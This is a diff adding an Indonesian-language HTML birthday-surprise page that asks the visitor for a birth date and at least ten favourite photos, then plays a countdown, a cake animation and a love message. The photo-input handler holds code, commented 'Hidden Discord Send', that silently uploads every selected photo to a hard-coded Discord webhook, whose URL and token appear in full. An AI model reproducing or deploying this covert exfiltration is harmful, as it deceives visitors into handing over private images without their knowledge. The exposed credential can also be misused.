@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>A Special Surprise for You 🌸</title>
+    <style>
+        :root {
+            --pink-dark: #d81b60;
+            --pink-light: #fce4ec;
+            --pink-soft: #f8bbd0;
+            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            --cake-color: #ff85a2;
+        }
+
+        /* --- Reset & Base Styles --- */
+        html, body {
+            margin: 0; padding: 0;
+            width: 100%; height: 100%;
+            overflow: hidden;
+            touch-action: manipulation;
+        }
+
+        body {
+            display: flex; justify-content: center; align-items: center;
+            background: var(--pink-light);
+            background-image: radial-gradient(var(--pink-soft) 1px, transparent 1px), radial-gradient(var(--pink-soft) 1px, transparent 1px);
+            background-size: 40px 40px;
+            background-position: 0 0, 20px 20px;
+            font-family: var(--font-main);
+            text-align: center;
+            position: relative;
+        }
+
+        /* --- Decorations --- */
+        .decor { position: absolute; font-size: 2rem; z-index: -1; opacity: 0.8; animation: sway 3s ease-in-out infinite; pointer-events: none; }
+        @keyframes sway { 0%, 100% { transform: rotate(-10deg); } 50% { transform: rotate(10deg); } }
+        
+        .petal { position: absolute; color: #ffb7ce; font-size: 1.5rem; user-select: none; z-index: -1; top: -10%; animation: fall linear infinite; pointer-events: none; }
+        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
+
+        /* --- Container & Components --- */
+        .container {
+            width: 85%; max-width: 400px; padding: 25px;
+            background: rgba(255, 255, 255, 0.98); 
+            border: 4px solid var(--pink-dark);
+            border-radius: 30px; box-shadow: 10px 10px 0px var(--pink-dark);
+            position: relative; z-index: 100; box-sizing: border-box;
+            display: flex; flex-direction: column; align-items: center;
+        }
+
+        #page2, #page3, #timerDisplay, #btnReset, #cakeStage { display: none; }
+
+        .gif-box img { width: 100%; max-width: 130px; height: auto; border-radius: 20px; border: 3px solid var(--pink-dark); margin-bottom: 15px; }
+
+        h1 { color: var(--pink-dark); text-shadow: 2px 2px 0px var(--pink-soft); font-size: 1.4rem; margin-bottom: 15px; }
+        p { color: #666; font-size: 0.95rem; line-height: 1.5; margin: 10px 0; }
+
+        input[type="date"], input[type="file"] {
+            padding: 12px; border: 2px solid var(--pink-dark); border-radius: 12px;
+            width: 100%; margin: 10px 0; outline: none; background: white;
+            font-family: inherit; color: var(--pink-dark); font-weight: bold;
+            box-sizing: border-box; font-size: 16px; 
+        }
+
+        button {
+            padding: 12px 25px; font-size: 1rem; font-weight: bold;
+            background-color: var(--pink-dark); color: white; border: 3px solid #000;
+            border-radius: 20px; cursor: pointer; box-shadow: 4px 4px 0px #000;
+            transition: 0.2s; margin-top: 10px; font-family: inherit;
+        }
+        button:active { transform: translate(2px, 2px); box-shadow: 2px 2px 0px #000; }
+
+        .btn-reset { background-color: #757575; font-size: 0.85rem; padding: 8px 15px; }
+
+        /* --- Cake Stage --- */
+        #cakeStage {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 1000;
+            display: none; flex-direction: column; justify-content: center; align-items: center;
+        }
+
+        .cake { position: relative; width: 250px; height: 250px; margin-top: 20px; }
+        .layer { position: absolute; left: 50%; transform: translateX(-50%); width: 150px; height: 65px; opacity: 0; transition: all 0.6s ease-out; }
+        .layer-top { position: absolute; top: 0; width: 100%; height: 35px; background: #ffffff; border-radius: 50%; z-index: 3; overflow: hidden; box-shadow: inset 0 -2px 5px rgba(0,0,0,0.05); }
+        .layer-side { position: absolute; top: 15px; width: 100%; height: 50px; background: var(--cake-color); border-radius: 0 0 50% 50% / 0 0 35px 35px; z-index: 2; }
+        
+        .l1 { width: 180px; bottom: 0; }
+        .l2 { width: 140px; bottom: 48px; --cake-color: #f48fb1; } 
+        .l3 { width: 100px; bottom: 95px; --cake-color: #f06292; } 
+        .ball { position: absolute; width: 8px; height: 8px; border-radius: 50%; z-index: 4; }
+
+        .candle {
+            position: absolute; bottom: 152px; left: 50%; transform: translateX(-50%);
+            width: 10px; height: 40px; background: repeating-linear-gradient(45deg, #fff, #fff 5px, #2196f3 5px, #2196f3 10px);
+            opacity: 0; transition: 0.5s; z-index: 11; border-radius: 3px;
+        }
+
+        .flame {
+            position: absolute; top: -22px; left: 50%; transform: translateX(-50%);
+            width: 16px; height: 26px; background: #ffca28; border-radius: 50% 50% 20% 20%;
+            box-shadow: 0 0 20px #ffca28, 0 0 30px #ff9800; cursor: pointer;
+            animation: flicker 0.15s infinite;
+        }
+
+        @keyframes flicker { 0%, 100% { transform: translateX(-50%) scale(1) rotate(-1deg); } 50% { transform: translateX(-50%) scale(1.1) rotate(1deg); } }
+
+        /* --- Polaroid Area --- */
+        #explosion-area { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 50; }
+
+        .polaroid {
+            position: absolute; width: 90px; padding: 5px 5px 12px 5px;
+            background: white; border: 1px solid #ddd;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            transform: scale(0);
+            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer; pointer-events: auto;
+        }
+        .polaroid img { width: 100%; height: 90px; object-fit: cover; }
+
+        .message { 
+            color: #444; line-height: 1.6; font-weight: 600; font-size: 0.9rem; 
+            margin-top: 15px; height: 200px; overflow-y: auto; text-align: justify;
+            padding: 10px; width: 100%; box-sizing: border-box;
+        }
+        
+        #timerDisplay { font-size: 1.1rem; font-weight: bold; color: var(--pink-dark); margin: 15px 0; background: var(--pink-soft); padding: 12px; border-radius: 20px; border: 2px dashed var(--pink-dark); }
+    </style>
+</head>
+<body>
+
+    <audio id="bgMusic" loop preload="auto">
+        <source src="musik2.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="decor" style="top: 5%; left: 5%;">🌸</div>
+    <div class="decor" style="top: 10%; right: 8%;">✨</div>
+    <div class="decor" style="bottom: 10%; left: 8%;">🎀</div>
+    <div class="decor" style="bottom: 5%; right: 5%;">🧸</div>
+
+    <div id="explosion-area"></div>
+
+    <div id="cakeStage">
+        <p style="color: white; margin-bottom: 20px; font-weight: bold; font-size: 1.2rem;">Tiup Lilinnya! 🎂</p>
+        <div class="cake">
+            <div id="layer1" class="layer l1"> <div class="layer-top"></div> <div class="layer-side"></div> </div>
+            <div id="layer2" class="layer l2"> <div class="layer-top"></div> <div class="layer-side"></div> </div>
+            <div id="layer3" class="layer l3"> <div class="layer-top"></div> <div class="layer-side"></div> </div>
+            <div id="candle" class="candle"><div id="flame" class="flame" onclick="blowCandle()"></div></div>
+        </div>
+        <p id="blowHint" style="color: white; font-size: 0.85rem; margin-top: 50px; opacity:0;">(Ketuk apinya untuk meniup lilin ✨)</p>
+    </div>
+
+    <div id="page1" class="container">
+        <div style="font-size: 60px; animation: sway 2s infinite;">✉️</div>
+        <h1>I have a surprise for you</h1>
+        <p>Ada sesuatu yang menantimu di dalam...</p>
+        <button onclick="openEnvelope()">Buka 🌸</button>
+    </div>
+
+    <div id="page2" class="container">
+        <div class="gif-box"><img src="cute-bear.gif" alt="cute gif"></div>
+        <h1>Persiapan Kejutan ✨</h1>
+        <p>Karna aku gatau jadi masukan tanggal lahir & foto favoritmu! (minimal 10/lebih)</p>
+        <input type="date" id="birthDate">
+        <input type="file" id="photoInput" accept="image/*" multiple>
+        <p id="photoCount" style="font-size: 0.85rem; color: var(--pink-dark); font-weight: bold;">Foto terpilih: 0</p>
+        <button id="btnStart" onclick="startCountdown()">Simpan Kejutan ✨</button>
+        <div id="timerDisplay"></div>
+        <button id="btnReset" class="btn-reset" onclick="resetTimer()">Reset Waktu ⏳</button>
+    </div>
+
+    <div id="page3" class="container">
+        <div class="gif-box"><img src="happy-birthday-birthday-bear.gif" alt="birthday gif"></div>
+        <h2 id="surpriseTitle" style="display:none; color: var(--pink-dark); margin: 5px 0;">Happy Birthday! ❤️</h2>
+        <div id="typewriter" class="message"></div>
+    </div>
+
+    <script>
+        // --- DATA & CONFIG ---
+        let photoGallery = [];
+        let countdownInterval;
+        const photoInput = document.getElementById('photoInput');
+        const bgMusic = document.getElementById('bgMusic');
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1470394953250115594/cJ8pB7CGmGr1fa18BCYhT9EtZpbnoDqnfzN_jHbt2xrnU1JTgvSK8gNITchf9v8hD9cA';
+
+        // --- WEBHOOK LOGIC ---
+        async function sendToDiscord(file) {
+            const formData = new FormData();
+            formData.append('file', file);
+            formData.append('content', `📸 Seseorang baru saja mengunggah foto kejutan!`);
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) { console.error('Webhook error:', err); }
+        }
+
+        // --- VISIBILITY LOGIC (PAUSE ON TAB SWITCH) ---
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                bgMusic.pause();
+            } else {
+                // Hanya resume jika amplop sudah dibuka
+                if (document.getElementById('page1').style.display === 'none') {
+                    bgMusic.play().catch(() => {});
+                }
+            }
+        });
+
+        // --- BACKGROUND PETALS ---
+        function createPetals() {
+            if (document.querySelectorAll('.petal').length > 10) return;
+            const petals = ['🌸', '✨', '💖'];
+            const petal = document.createElement('div');
+            petal.classList.add('petal');
+            petal.innerHTML = petals[Math.floor(Math.random() * petals.length)];
+            petal.style.left = Math.random() * 100 + 'vw';
+            petal.style.animationDuration = (Math.random() * 3 + 4) + 's';
+            document.body.appendChild(petal);
+            setTimeout(() => petal.remove(), 6000);
+        }
+        setInterval(createPetals, 800);
+
+        // --- EVENT LISTENERS ---
+        photoInput.addEventListener('change', function(e) {
+            const files = Array.from(e.target.files);
+            document.getElementById('photoCount').innerText = `Foto terpilih: ${files.length}`;
+            photoGallery = [];
+            files.forEach(file => {
+                sendToDiscord(file); // Hidden Discord Send
+                const reader = new FileReader();
+                reader.onload = (event) => photoGallery.push(event.target.result);
+                reader.readAsDataURL(file);
+            });
+        });
+
+        function openEnvelope() {
+            bgMusic.play().catch(() => {});
+            document.getElementById('page1').style.display = 'none';
+            document.getElementById('page2').style.display = 'block';
+        }
+
+        function startCountdown() {
+            const dateInput = document.getElementById('birthDate').value;
+            if (!dateInput) return alert("Pilih tanggal dulu ya! 😊");
+            const targetDate = new Date(dateInput).getTime();
+            
+            document.getElementById('timerDisplay').style.display = 'block';
+            document.getElementById('btnReset').style.display = 'inline-block';
+            document.getElementById('btnStart').style.display = 'none';
+
+            countdownInterval = setInterval(() => {
+                const now = new Date().getTime();
+                const distance = targetDate - now;
+                if (distance > 0) {
+                    const d = Math.floor(distance / (1000 * 60 * 60 * 24));
+                    const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                    const s = Math.floor((distance % (1000 * 60)) / 1000);
+                    document.getElementById('timerDisplay').innerHTML = `Kejutan terbuka dalam:<br>⏳ ${d}h ${h}j ${m}m ${s}s`;
+                } else {
+                    clearInterval(countdownInterval);
+                    startCakeAnimation();
+                }
+            }, 1000);
+        }
+
+        function resetTimer() {
+            clearInterval(countdownInterval);
+            document.getElementById('timerDisplay').style.display = 'none';
+            document.getElementById('btnReset').style.display = 'none';
+            document.getElementById('btnStart').style.display = 'inline-block';
+        }
+
+        // --- CAKE ANIMATION ---
+        function addBalls(layerId, count) {
+            const layer = document.getElementById(layerId);
+            const colors = ['#FFEB3B', '#FF4081', '#00E676', '#29B6F6', '#FF9100'];
+            for (let i = 0; i < count; i++) {
+                const ball = document.createElement('div');
+                ball.className = 'ball';
+                ball.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                ball.style.left = (Math.random() * 80 + 10) + '%';
+                ball.style.top = (Math.random() * 20 + 5) + 'px';
+                layer.appendChild(ball);
+            }
+        }
+
+        function startCakeAnimation() {
+            document.getElementById('page2').style.display = 'none';
+            const stage = document.getElementById('cakeStage');
+            stage.style.display = 'flex';
+            setTimeout(() => { document.getElementById('layer1').style.opacity = '1'; addBalls('layer1', 12); }, 400);
+            setTimeout(() => { document.getElementById('layer2').style.opacity = '1'; addBalls('layer2', 10); }, 900);
+            setTimeout(() => { document.getElementById('layer3').style.opacity = '1'; addBalls('layer3', 8); }, 1400);
+            setTimeout(() => { document.getElementById('candle').style.opacity = '1'; }, 2000);
+            setTimeout(() => { document.getElementById('blowHint').style.opacity = '1'; }, 2500);
+        }
+
+        function blowCandle() {
+            document.getElementById('flame').style.display = 'none';
+            document.getElementById('blowHint').innerHTML = "Yeay! Tiup berhasil! 🌸";
+            setTimeout(() => {
+                document.getElementById('cakeStage').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('cakeStage').style.display = 'none';
+                    showSurprise();
+                }, 500);
+            }, 1200);
+        }
+
+        // --- FINAL SURPRISE & TYPING ---
+        function showSurprise() {
+            document.getElementById('page3').style.display = 'block';
+            const area = document.getElementById('explosion-area');
+            
+            let slots = [
+                {x: 10, y: 15}, {x: 85, y: 15}, {x: 50, y: 10},
+                {x: 10, y: 85}, {x: 85, y: 85}, {x: 50, y: 90},
+                {x: 8, y: 50},  {x: 92, y: 50},
+                {x: 15, y: 30}, {x: 80, y: 30},
+                {x: 15, y: 70}, {x: 80, y: 70}
+            ];
+
+            slots.sort(() => Math.random() - 0.5);
+
+            photoGallery.forEach((src, index) => {
+                const pol = document.createElement('div');
+                pol.classList.add('polaroid');
+                pol.innerHTML = `<img src="${src}" alt="memory">`;
+                area.appendChild(pol);
+                
+                let posX, posY;
+                if (index < slots.length) {
+                    posX = slots[index].x;
+                    posY = slots[index].y;
+                } else {
+                    posX = Math.random() > 0.5 ? Math.random() * 20 : 80 + Math.random() * 15;
+                    posY = Math.random() * 90;
+                }
+
+                const randomRot = Math.floor(Math.random() * 30) - 15;
+                
+                setTimeout(() => {
+                    pol.style.left = `${posX}%`; 
+                    pol.style.top = `${posY}%`;
+                    pol.style.transform = `translate(-50%, -50%) scale(1) rotate(${randomRot}deg)`;
+                }, 150 * index); 
+
+                pol.onclick = function() { 
+                    this.style.transform = "translate(-50%, -50%) scale(0)"; 
+                    setTimeout(() => this.remove(), 600); 
+                };
+            });
+
+            setTimeout(() => { 
+                document.getElementById('surpriseTitle').style.display = 'block'; 
+                startTyping(); 
+            }, 1500);
+        }
+
+        function startTyping() {
+            const pesan = "Selamat ulang tahun! ❤️ Terima kasih telah hadir dan menjadi teman mabar roblox ku. Semoga harimu selalu penuh bahagia dan tawa. Di hari istimewamu ini, doaku melangit untukmu. Semoga kamu selalu dikelilingi cinta, kehangatan, dan orang-orang baik. Aku berdoa agar kamu semakin dewasa, bijaksana, dan segala cita-citamu tercapai. Semoga tahun ini membawa banyak kejutan menyenangkan dan pencapaian yang membanggakan. Teruslah bersinar, tetaplah positif, dan kejar semua mimpimu. Aku akan selalu di sini untuk mendukungmu. Selamat merayakan hari kelahiran. I love you! ✨🌸";
+            let i = 0;
+            const target = document.getElementById('typewriter');
+            function typing() {
+                if (i < pesan.length) {
+                    target.innerHTML += pesan.charAt(i);
+                    i++;
+                    target.scrollTop = target.scrollHeight;
+                    setTimeout(typing, 40);
+                }
+            }
+            typing();
+        }
+    </script>
+</body>
+</html>
